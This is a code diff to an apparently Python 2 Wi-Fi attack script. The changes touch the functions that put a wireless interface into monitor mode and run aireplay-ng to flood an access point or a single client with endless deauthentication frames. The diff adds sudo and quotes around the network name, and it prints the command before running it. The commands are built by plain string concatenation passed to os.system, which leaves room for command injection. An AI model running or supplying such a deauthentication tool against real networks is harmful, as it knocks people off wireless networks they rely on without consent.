@@ -87,13 +87,12 @@ def deauth_client():
 	os.system("sudo iwconfig "+interfaz+" mode monitor")
 	os.system("sudo ifconfig "+interfaz+" up")
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
-	os.system("aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e "+essid+" "+interfaz)
+	os.system("sudo aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e \""+essid+"\" "+interfaz)
 
 
 def deauth_ap():
 	id_red = raw_input('Select id: ')
 	red=redes[int(id_red)]
-	print red
 	ap_mac=red.get("mac")
 	essid=red.get("ssid")
 	channel=red.get("canal")
@@ -101,8 +100,9 @@ def deauth_ap():
 	os.system("sudo iwconfig "+interfaz+" mode monitor")
 	os.system("sudo ifconfig "+interfaz+" up")
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
-	os.system("aireplay-ng -0 0 -a "+ap_mac+" -e "+essid+" "+interfaz)
-
+	cmmd= ("sudo aireplay-ng -0 0 -a "+ap_mac+" -e \""+essid+"\" "+interfaz)
+	print cmmd
+	os.system(cmmd)
 
 def deauth():
 	deauth_type=raw_input("1: AP deauth \n2: Client deauth\n")
